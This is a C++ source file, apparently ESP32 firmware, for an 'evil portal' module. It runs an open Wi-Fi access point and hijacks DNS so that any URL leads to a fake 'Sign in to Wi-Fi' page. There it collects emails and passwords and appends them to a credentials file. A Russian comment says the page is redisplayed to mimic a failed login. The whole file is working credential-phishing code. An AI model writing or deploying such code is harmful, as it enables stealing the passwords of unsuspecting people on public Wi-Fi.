#include "EvilPortalModule.h"
#include "core/Logger.h"
#include "modules/StorageModule/StorageModule.h"
#include <WiFi.h>
#include <FS.h>

static const char* TAG = "Portal";

EvilPortalModule* EvilPortalModule::_self = nullptr;

bool EvilPortalModule::init() {
    _self = this;
    return true;
}

void EvilPortalModule::start(const String& ssid) {
    if (_active) return;
    _ssid = ssid;
    _captured = 0;

    WiFi.mode(WIFI_AP);
    WiFi.softAP(_ssid.c_str());                 // открытая сеть
    IPAddress ip = WiFi.softAPIP();

    _dns.start(53, "*", ip);                    // captive: всё → наш IP

    _server.on("/login", [this] { handleLogin(); });
    _server.onNotFound([this] { handlePortal(); });   // любой URL → портал
    _server.begin();

    _active = true;
    LOGW(TAG, "captive portal up: %s @ %s", _ssid.c_str(), ip.toString().c_str());
}

void EvilPortalModule::stop() {
    if (!_active) return;
    _dns.stop();
    _server.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    _active = false;
    LOGI(TAG, "portal down (captured %d)", _captured);
}

void EvilPortalModule::update(uint32_t) {
    if (!_active) return;
    _dns.processNextRequest();
    _server.handleClient();
}

void EvilPortalModule::handlePortal() {
    String h = F("<!doctype html><meta name=viewport content='width=device-width,initial-scale=1'>"
                 "<style>body{font-family:-apple-system,sans-serif;max-width:360px;margin:40px auto;padding:0 16px}"
                 "input{width:100%;box-sizing:border-box;padding:12px;margin:6px 0;border:1px solid #ccc;border-radius:8px}"
                 "button{width:100%;padding:12px;border:0;border-radius:8px;background:#007aff;color:#fff;font-size:16px}</style>");
    h += "<h2>Sign in to Wi-Fi</h2>"
         "<form method=POST action='/login'>"
         "<input name=u placeholder='Email'>"
         "<input name=p type=password placeholder='Password'>"
         "<button>Connect</button></form>";
    _server.send(200, "text/html", h);
}

void EvilPortalModule::handleLogin() {
    String u = _server.arg("u");
    String p = _server.arg("p");
    _captured++;

    fs::FS* fs = StorageModule::instance().fs();
    if (fs) {
        File f = fs->open("/portal_creds.txt", FILE_APPEND);
        if (f) { f.printf("%s:%s\n", u.c_str(), p.c_str()); f.close(); }
    }
    LOGW(TAG, "captured creds #%d", _captured);
    // Возврат на портал (правдоподобно «не получилось, попробуйте снова»).
    handlePortal();
}
